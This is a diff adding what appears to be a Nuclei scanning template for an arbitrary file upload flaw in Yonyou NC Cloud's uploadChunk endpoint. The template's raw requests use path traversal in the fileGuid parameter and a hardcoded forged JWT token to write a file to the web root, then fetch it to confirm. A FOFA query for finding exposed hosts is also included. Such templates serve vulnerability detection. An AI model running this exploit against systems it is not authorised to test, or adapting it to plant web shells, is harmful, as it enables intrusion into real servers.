@@ -1,0 +1,39 @@
+id: yonyou-nc-cloud-ncchr-okr-attachment-uploadchunk-fileupload
+info:
+  name: yonyou-nc-cloud-ncchr-okr-attachment-uploadchunk-fileupload
+  author: msksec
+  severity: high
+  tags: yongyou,fileupload
+  description: 用友NCCloud /ncchr/pm/okr/attachment/uploadChunk存在任意文件上传
+  reference:
+    - https://
+  metadata: 
+    fofa-query: app="用友-NC-Cloud"
+    verified: true
+    max-request: 1
+
+variables:
+  filename: '{{to_lower(rand_base(10))}}'
+
+http:
+  - raw:
+      - |
+        POST /ncchr/pm/okr/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+        --024ff46f71634a1c9bf8ec5820c26fa9
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+
+        {{randstr}}
+        --024ff46f71634a1c9bf8ec5820c26fa9--
+
+      - |
+        GET /nccloud/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains((body), '{{randstr}}')"
